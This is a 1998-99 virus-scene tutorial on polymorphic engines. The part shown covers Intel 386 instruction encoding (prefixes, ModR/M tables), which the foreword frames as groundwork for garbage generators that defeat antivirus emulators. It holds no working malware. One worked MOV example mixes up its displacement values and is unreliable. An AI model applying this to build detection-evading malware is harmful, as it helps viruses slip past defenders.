; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
; ³     Following you have the original article, spell checked, arranged   ³
; ³     and... with God's help, bug checked...                             ³
; ³                                                                        ³
; ³                                     Lord Julus - Feb. 1999             ³
; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

     ÚÄÄÄÄÄÄÄ¿ÚÄÄÄÄÄ¿Ú¿     Ú¿ÚÄÄÄÄ¿ÚÄÄÄ¿ÚÄÄ¿ ÚÄÄ¿Ú¿ Ú¿Ú¿ÚÄÄÄÄ¿ÚÄÄÄÄÄÄÄ¿
     ³ÚÄÄÄÄÄ¿³³ÚÄÄÄ¿³³³     ³³³Ú¿Ú¿³³ O ³³ÚÄÅ¿³ÚÄÙ³ÀÄÙ³³³³ÚÄÄÄÙ³       ³
     ³ÀÄÄÄÄÄÙ³³³   ³³³³     ³³³³ÀÙ³³ÀÄÄÄÙÀÙ ÀÙ³³  ³ÚÄ¿³³³³ÀÄÄÄ¿³ÚÄ¿ ÚÄ¿³
     ³ÚÄÄÄÄÄÄÙ³³   ³³³³     ³³ÀÙ  ÀÙ          ÀÙ  ³³ ³³³³ÀÄÄÄ¿³³³ ³ ³ ³³
     ³³       ³³   ³³³³     ³³                    ³³ ³³³³    ³³³³ ÀÄÙ ³³
     ³³       ³³   ³³³ÀÄÄÄÄ¿ÀÙ                    ÀÙ ÀÙ³³    ³³³³     ³³
     ³³       ³³   ³³ÀÄÄÄÄÄÙ                           ÀÙ    ³³³³     ³³
     ³³       ³³   ³³                                        ³³³³     ³³
     ³³       ³ÀÄÄÄÙ³          T U T O R I A L           ÚÄÄÄÙ³³³     ³³
     ³³       ÀÄÄÄÄÄÙ                                    ÀÄÄÄÄÙ³³     ³³
     ³³                         P A R T   I I                  ³³     ³³
     ³³                                                        ³³     ³³
     ÀÙ                    (C) 1998 - Lord Julus               ÀÙ     ÀÙ

ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
            POLYMORPHISM TUTORIAL PART II V1.0 - ADVANCED APPROACH
ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ


ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[  foreword  ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

        Well,  people...  It's  been a full year since the first part of this
 article  was  released over the Net, and I can say it was pretty good at the
 time.  This made it appear in the second issue of the 29A viral magazine. At
 the  end  of  the  article  I  was  speaking, blindly at the time, about the
 changing   of  the  times  and  the  migration  towards  the  32bit  Windows
 programming.  Well, it seems that Windowz is here to stay, so we all have to
 agree...windows  32bit  programming  is  a  'must know'... Then the question
 comes... how much can we rely on old 16bit thingies? As for hardware access,
 the  answer  is  ZERO...  But  still, the microprocessor is almost the same.
 Everything  you  had in 16bit still exists in 32bit... So, can we use any of
 the old stuff? The answer here is 'a lot'!

        Right  after  the  beginning  of  the  win32 asm programs, the people
 started  to  ask whether or not a polymorphic engine can be done in win32 or
 not. Being a curious man I started to dig... As a matter of fact by the time
 you read this my first win32 poly engine is already finished.

        So, what do I intend to do in this article?

        If  you  read  my  first article, you must know: it stays on! In this
 article  I  will  not  give you more ideas on the decryptor itself (check my
 encryption  articles  for  that),  but  I  shall  concentrate on the garbage
 generator,  as the best way to hide the real decryptor. In the first article
 I  described  the  way some instructions are created... Here I will describe
 ALL  the instructions and I will try to present  an easy way to generate ALL
 of them. I shall give you some ideas that will make a code emulator in great
 difficulty...  At  the end I will explain the win32 things  you need to make
 in order to make a win32 poly engine... So, let's run!


ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[  credits  ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

        There  is always somebody in this bussiness who had such an influence
 on you that he deserves all the credits... Just a small piece of it:

          dark avenger, dark fiber, dark angel, darkman, mr.sandman,
        virtual daemon, qark, quantum, b0z0, wild worker, black baron,
        the unforgiven, murkry, shaitan, tatung, jacky qwerty, griyo,
      kid chaos, cicatrix, priest, liquid jesus, metabolis, nowhere man,
           opic, blue skull, hellfire, hellraiser, and many more...

                  a piece of my knowledge is right there...

                  A special thanx to the entire SLAM group!


ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[  legal disclaimer  ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

        The following document is a study based on information made public by
 Intel(c).  The information revealed here is not intended to harm anybody and
 the  author cannot be held responsible for it's use that led to data loss or
 damage.  This  article  represent  a comprehesive explanation of the methods
 behind   the   opcode  generation  inside  the  Intel  or  Intel  compatible
 microprocessors.


ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[  the source  ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


        The  biggest  part  of this tutorial is based on Intel's original 386
 documentation,   and   more   specific   the  part  that  speaks  about  the
 microprocessor's  instructions.  I  need  to  talk  about  this  so  you can
 understand and see how easy is it to generate whatever instruction you want.
 I  will  also  not bother to quote what I pasted from Intel's manual, as you
 will  surely recognize the famous opcode tables... The thing is, do you know
 how to use them, or, actually, do you know how to optimize their use? If you
 do, please tell me...;-)) Because, as far as I am concerned, I couldn't find
 anything better than the things you are gonna read right away...
        Anyway,  the  article  is  divided  in  2  big parts: the instruction
 description and the specific poly engine techniques.


                            ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´       PART I      ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                            ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[  instruction set  ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ



<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Operand-Size and Address-Size Attributes


        When  executing  an  instruction,  the 80386 can address memory using
 either  16  or  32-bit  addresses.  Consequently, each instruction that uses
 memory  addresses has associated with it an address-size attribute of either
 16  or 32 bits. 16-bit addresses imply both the use of a 16-bit displacement
 in  the  instruction  and the generation of a 16-bit address offset (segment
 relative  address)  as  the  result  of  the  effective address calculation.
 32-bit  addresses  imply the use of a 32-bit displacement and the generation
 of  a  32-bit  address offset. Similarly, an instruction that accesses words
 (16  bits)  or doublewords (32 bits) has an operand-size attribute of either
 16 or 32 bits.

        The   attributes   are  determined  by  a  combination  of  defaults,
 instruction  prefixes,  and  (for  programs  executing  in  protected  mode)
 size-specification bits in segment descriptors.

        Programs  that  execute in real mode or virtual-8086 mode have 16-bit
 addresses and operands by default.

        The  internal  encoding  of  an instruction can include two byte-long
 prefixes:  the  address-size  prefix, 67H, and the operand-size prefix, 66H.
 These  prefixes  override the default segment attributes for the instruction
 that  follows.  The next table shows the effect of each possible combination
 of defaults and overrides.

        Instructions that use the stack implicitly (for example: POP EAX also
 have  a  stack  address-size attribute of either 16 or 32 bits. Instructions
 with  a  stack  address-size attribute of 16 use the 16-bit SP stack pointer
 register;  instructions  with  a stack address-size attribute of 32 bits use
 the 32-bit ESP register to form the address of the top of the stack.

    ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
    ³ Segment Default D = ...  ³   0    0    0    0    1    1    1    1 ³
    ³ Operand-Size Prefix 66H  ³   N    N    Y    Y    N    N    Y    Y ³
    ³ Address-Size Prefix 67H  ³   N    Y    N    Y    N    Y    N    Y ³
    ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
    ³ Effective Operand Size   ³  16   16   32   32   32   32   16   16 ³
    ³ Effective Address Size   ³  16   32   16   32   32   16   32   16 ³
    ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
    ³ Y = Yes, this instruction prefix is present                       ³
    ³ N = No, this instruction prefix is not present                    ³
    ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

        So,  basically,  one  instruction has an operand and/or an address to
 work  with. We can have all kinds of combinations of 16 and 32 bit and also,
 we  can  override the defaults. The override prefix can appear no matter how
 many times, but only the last one will do the job.


<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Instruction Format

        All  instruction  encodings  are  subsets  of the general instruction
 format   shown   in  the  next  figure.  Instructions  consist  of  optional
 instruction  prefixes,  one or two primary opcode bytes, possibly an address
 specifier consisting of the ModR/M byte and the SIB (Scale Index Base) byte,
 a displacement, if required, and an immediate data field, if required.

        Smaller  encoding  fields can be defined within the primary opcode or
 opcodes. These fields define the direction of the operation, the size of the
 displacements,  the  register  encoding,  or sign extension; encoding fields
 vary depending on the class of operation.

        Most  instructions  that  can  refer  to an operand in memory have an
 addressing form byte following the primary opcode byte(s). This byte, called
 the ModR/M byte, specifies the address form to be used. Certain encodings of
 the  ModR/M  byte  indicate  a  second addressing byte, the SIB (Scale Index
 Base)  byte,  which follows the ModR/M byte and is required to fully specify
 the addressing form.

        Addressing  forms  can  include  a displacement immediately following
 either  the  ModR/M or SIB byte. If a displacement is present, it can be 8-,
 16- or 32-bits.

        If  the  instruction  specifies  an  immediate operand, the immediate
 operand  always  follows  any  displacement bytes. The immediate operand, if
 specified, is always the last field of the instruction.

 The following are the allowable instruction prefix codes:

   F3H    REP prefix (used only with string instructions)
   F3H    REPE/REPZ prefix (used only with string instructions
   F2H    REPNE/REPNZ prefix (used only with string instructions)
   F0H    LOCK prefix

 The following are the segment override prefixes:

   2EH    CS segment override prefix
   36H    SS segment override prefix
   3EH    DS segment override prefix
   26H    ES segment override prefix
   64H    FS segment override prefix
   65H    GS segment override prefix
   66H    Operand-size override
   67H    Address-size override


      80386 Instruction Format

   P  ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   R  ³  INSTRUCTION  ³   ADDRESS-    ³    OPERAND-   ³   SEGMENT     ³
   E  ³    PREFIX     ³  SIZE PREFIX  ³  SIZE PREFIX  ³   OVERRIDE    ³
   F  ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
   I  ³     0 OR 1         0 OR 1           0 OR 1         0 OR 1     ³
   X  ÃÄ Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä´
   E  ³                        NUMBER OF BYTES                        ³
   S  ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   R  ÚÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   E  ³  OPCODE  ³  MODR/M   ³  SIB  ³   DISPLACEMENT   ³  IMMEDIATE  ³
   Q  ³          ³           ³       ³                  ³             ³
   U  ÃÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄ´
   I  ³  1 OR 2     0 OR 1    0 OR 1      0,1,2 OR 4       0,1,2 OR 4 ³
   R  ÃÄ Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä´
   E  ³                        NUMBER OF BYTES                        ³
   D  ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

        This  being  said,  we  may  have  instructions with minimum one byte
 length and maximum 16 bytes length.


<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ ModR/M and SIB Bytes

        The  ModR/M  and  SIB  bytes follow the opcode byte(s) in many of the
 80386 instructions. They contain the following information:

  ş  The indexing type or register number to be used in the instruction
  ş  The register to be used, or more information to select the instruction
  ş  The base, index, and scale information

 The ModR/M byte contains three fields of information:

  ş  The mod field, which occupies the two most significant bits of the
     byte, combines with the r/m field to form 32 possible values: eight
     registers and 24 indexing modes

  ş  The reg field, which occupies the next three bits following the mod
     field, specifies either a register number or three more bits of opcode
     information. The meaning of the reg field is determined by the first
     (opcode) byte of the instruction.

  ş  The r/m field, which occupies the three least significant bits of the
     byte, can specify a register as the location of an operand, or can form
     part of the addressing-mode encoding in combination with the field as
     described above

        The  based  indexed  and  scaled  indexed  forms of 32-bit addressing
 require  the  SIB byte. The presence of the SIB byte is indicated by certain
 encodings  of  the  ModR/M  byte.  The  SIB byte then includes the following
 fields:

  ş  The ss field, which occupies the two most significant bits of the
     byte, specifies the scale factor

  ş  The index field, which occupies the next three bits following the ss
     field and specifies the register number of the index register

  ş  The base field, which occupies the three least significant bits of the
     byte, specifies the register number of the base register


  ModR/M and SIB Byte Formats

                                 MODR/M BYTE

                     7    6    5    4    3    2    1    0
                    ÚÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
                    ³  MOD   ³ REG/OPCODE  ³     R/M     ³
                    ÀÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

                          SIB (SCALE INDEX BASE) BYTE

                     7    6    5    4    3    2    1    0
                    ÚÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
                    ³   SS   ³    INDEX    ³    BASE     ³
                    ÀÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÙ


        Let's  get  down to real bussiness now. Here below you have 2 tables.
 Using  these  tables  will allow you to create ANY kind of instructions. The
 first row gives you the used register. If you have 8 bit addressing you will
 use  the  8  bit  registers,  with 16 bit addressing you will use the 16 bit
 registers,  and  32  bit with 32 bit registers. Actualy not you, you use the
 same  codification,  but  it's the processor that interprets it accordingly.
 Following  this  you  have  4  parts  with  8  possible codification for the
 addressing  mode.  The  first two number columns contain the MOD and the R/M
 field  and  after  that the hexadecimal encoding you would obtain if next to
 the  MOD  and R/M fields you would put the REG field. As normal as possible,
 this will create a matrix of 8 types * 4 parts * 8 registers = 256 variants.

 16-Bit Addressing Forms with the ModR/M Byte

 ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄ¿
 ³ r8(/r)                   ³ AL  ³ CL  ³ DL  ³ BL  ³ AH  ³ CH  ³ DH  ³ BH  ³
 ³ r16(/r)                  ³ AX  ³ CX  ³ DX  ³ BX  ³ SP  ³ BP  ³ SI  ³ DI  ³
 ³ r32(/r)                  ³ EAX ³ ECX ³ EDX ³ EBX ³ ESP ³ EBP ³ ESI ³ EDI ³
 ³ /digit (Opcode)          ³ 0   ³ 1   ³ 2   ³ 3   ³ 4   ³ 5   ³ 6   ³ 7   ³
 ³ REG =                    ³ 000 ³ 001 ³ 010 ³ 011 ³ 100 ³ 101 ³ 110 ³ 111 ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄ´
 ³                ³ Mod R/M ³         ModR/M Values in Hexadecimal          ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄ´
 ³ [BX + SI]      ³ 00  000 ³ 00  ³ 08  ³ 10  ³ 18  ³ 20  ³ 28  ³ 30  ³ 38  ³
 ³ [BX + DI]      ³ 00  001 ³ 01  ³ 09  ³ 11  ³ 19  ³ 21  ³ 29  ³ 31  ³ 39  ³
 ³ [BP + SI]      ³ 00  010 ³ 02  ³ 0A  ³ 12  ³ 1A  ³ 22  ³ 2A  ³ 32  ³ 3A  ³
 ³ [BP + DI]      ³ 00  011 ³ 03  ³ 0B  ³ 13  ³ 1B  ³ 23  ³ 2B  ³ 33  ³ 3B  ³
 ³ [SI]           ³ 00  100 ³ 04  ³ 0C  ³ 14  ³ 1C  ³ 24  ³ 2C  ³ 34  ³ 3C  ³
 ³ [DI]           ³ 00  101 ³ 05  ³ 0D  ³ 15  ³ 1D  ³ 25  ³ 2D  ³ 35  ³ 3D  ³
 ³ disp16         ³ 00  110 ³ 06  ³ 0E  ³ 16  ³ 1E  ³ 26  ³ 2E  ³ 36  ³ 3E  ³
 ³ [BX]           ³ 00  111 ³ 07  ³ 0F  ³ 17  ³ 1F  ³ 27  ³ 2F  ³ 37  ³ 3F  ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄ´
 ³ [BX+SI]+disp8  ³ 01  000 ³ 40  ³ 48  ³ 50  ³ 58  ³ 60  ³ 68  ³ 70  ³ 78  ³
 ³ [BX+DI]+disp8  ³ 01  001 ³ 41  ³ 49  ³ 51  ³ 59  ³ 61  ³ 69  ³ 71  ³ 79  ³
 ³ [BP+SI]+disp8  ³ 01  010 ³ 42  ³ 4A  ³ 52  ³ 5A  ³ 62  ³ 6A  ³ 72  ³ 7A  ³
 ³ [BP+DI]+disp8  ³ 01  011 ³ 43  ³ 4B  ³ 53  ³ 5B  ³ 63  ³ 6B  ³ 73  ³ 7B  ³
 ³ [SI]+disp8     ³ 01  100 ³ 44  ³ 4C  ³ 54  ³ 5C  ³ 64  ³ 6C  ³ 74  ³ 7C  ³
 ³ [DI]+disp8     ³ 01  101 ³ 45  ³ 4D  ³ 55  ³ 5D  ³ 65  ³ 6D  ³ 75  ³ 7D  ³
 ³ [BP]+disp8     ³ 01  110 ³ 46  ³ 4E  ³ 56  ³ 5E  ³ 66  ³ 6E  ³ 76  ³ 7E  ³
 ³ [BX]+disp8     ³ 01  111 ³ 47  ³ 4F  ³ 57  ³ 5F  ³ 67  ³ 6F  ³ 77  ³ 7F  ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄ´
 ³ [BX+SI]+disp16 ³ 10  000 ³ 80  ³ 88  ³ 90  ³ 98  ³ A0  ³ A8  ³ B0  ³ B8  ³
 ³ [BX+DI]+disp16 ³ 10  001 ³ 81  ³ 89  ³ 91  ³ 99  ³ A1  ³ A9  ³ B1  ³ B9  ³
 ³ [BP+SI]+disp16 ³ 10  010 ³ 82  ³ 8A  ³ 92  ³ 9A  ³ A2  ³ AA  ³ B2  ³ BA  ³
 ³ [BP+DI]+disp16 ³ 10  011 ³ 83  ³ 8B  ³ 93  ³ 9B  ³ A3  ³ AB  ³ B3  ³ BB  ³
 ³ [SI]+disp16    ³ 10  100 ³ 84  ³ 8C  ³ 94  ³ 9C  ³ A4  ³ AC  ³ B4  ³ BC  ³
 ³ [DI]+disp16    ³ 10  101 ³ 85  ³ 8D  ³ 95  ³ 9D  ³ A5  ³ AD  ³ B5  ³ BD  ³
 ³ [BP]+disp16    ³ 10  110 ³ 86  ³ 8E  ³ 96  ³ 9E  ³ A6  ³ AE  ³ B6  ³ BE  ³
 ³ [BX]+disp16    ³ 10  111 ³ 87  ³ 8F  ³ 97  ³ 9F  ³ A7  ³ AF  ³ B7  ³ BF  ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄ´
 ³ EAX/AX/AL      ³ 11  000 ³ C0  ³ C8  ³ D0  ³ D8  ³ E0  ³ E8  ³ F0  ³ F8  ³
 ³ ECX/CX/CL      ³ 11  001 ³ C1  ³ C9  ³ D1  ³ D9  ³ E1  ³ E9  ³ F1  ³ F9  ³
 ³ EDX/DX/DL      ³ 11  010 ³ C2  ³ CA  ³ D2  ³ DA  ³ E2  ³ EA  ³ F2  ³ FA  ³
 ³ EBX/BX/BL      ³ 11  011 ³ C3  ³ CB  ³ D3  ³ DB  ³ E3  ³ EB  ³ F3  ³ FB  ³
 ³ ESP/SP/AH      ³ 11  100 ³ C4  ³ CC  ³ D4  ³ DC  ³ E4  ³ EC  ³ F4  ³ FC  ³
 ³ EBP/BP/CH      ³ 11  101 ³ C5  ³ CD  ³ D5  ³ DD  ³ E5  ³ ED  ³ F5  ³ FD  ³
 ³ ESI/SI/DH      ³ 11  110 ³ C6  ³ CE  ³ D6  ³ DE  ³ E6  ³ EE  ³ F6  ³ FE  ³
 ³ EDI/DI/BH      ³ 11  111 ³ C7  ³ CF  ³ D7  ³ DF  ³ E7  ³ EF  ³ F7  ³ FF  ³
 ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÙ

        Ok, let's see some examples:

        MOV BX, [BX+DI+1234h]

        1111h tells us we have a disp16, so we will look in the MOD=10 part;
        [BX+DI] puts us on the second row of that part;
        BX makes us look on the fourth REG row;
        MOV opcode is 8B (you will learn this later)

        this all coming to: 99h

        So, MOV BX, [BX+DI+1111h] will be encoded like this:

        8Bh 99h 34h 12h,

        1234h  immediately  follows  the  ModR/M  byte, as it is an immediate
 value.

 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
 NOTES:  disp8 denotes an 8-bit displacement following the ModR/M byte, to be
 sign-extended  and  added to the index. disp16 denotes a 16-bit displacement
 following  the  ModR/M  byte,  to  be  added  to  the index. Default segment
 register  is  SS  for  the effective addresses containing a BP index, DS for
 other effective addresses.
 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


        Let's take a peak now to 32 bit addressing codes:

 32-Bit Addressing Forms with the ModR/M Byte

 ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄ¿
 ³ r8(/r)                   ³ AL  ³ CL  ³ DL  ³ BL  ³ AH  ³ CH  ³ DH  ³ BH  ³
 ³ r16(/r)                  ³ AX  ³ CX  ³ DX  ³ BX  ³ SP  ³ BP  ³ SI  ³ DI  ³
 ³ r32(/r)                  ³ EAX ³ ECX ³ EDX ³ EBX ³ ESP ³ EBP ³ ESI ³ EDI ³
 ³ /digit (Opcode)          ³ 0   ³ 1   ³ 2   ³ 3   ³ 4   ³ 5   ³ 6   ³ 7   ³
 ³ REG =                    ³ 000 ³ 001 ³ 010 ³ 011 ³ 100 ³ 101 ³ 110 ³ 111 ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄ´
 ³                ³ Mod R/M ³          ModR/M Values in Hexadecimal         ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄ´
 ³ [EAX]          ³ 00  000 ³ 00  ³ 08  ³ 10  ³ 18  ³ 20  ³ 28  ³ 30  ³ 38  ³
 ³ [ECX]          ³ 00  001 ³ 01  ³ 09  ³ 11  ³ 19  ³ 21  ³ 29  ³ 31  ³ 39  ³
 ³ [EDX]          ³ 00  010 ³ 02  ³ 0A  ³ 12  ³ 1A  ³ 22  ³ 2A  ³ 32  ³ 3A  ³
 ³ [EBX]          ³ 00  011 ³ 03  ³ 0B  ³ 13  ³ 1B  ³ 23  ³ 2B  ³ 33  ³ 3B  ³
 ³ [--] [--]      ³ 00  100 ³ 04  ³ 0C  ³ 14  ³ 1C  ³ 24  ³ 2C  ³ 34  ³ 3C  ³
 ³ disp32         ³ 00  101 ³ 05  ³ 0D  ³ 15  ³ 1D  ³ 25  ³ 2D  ³ 35  ³ 3D  ³
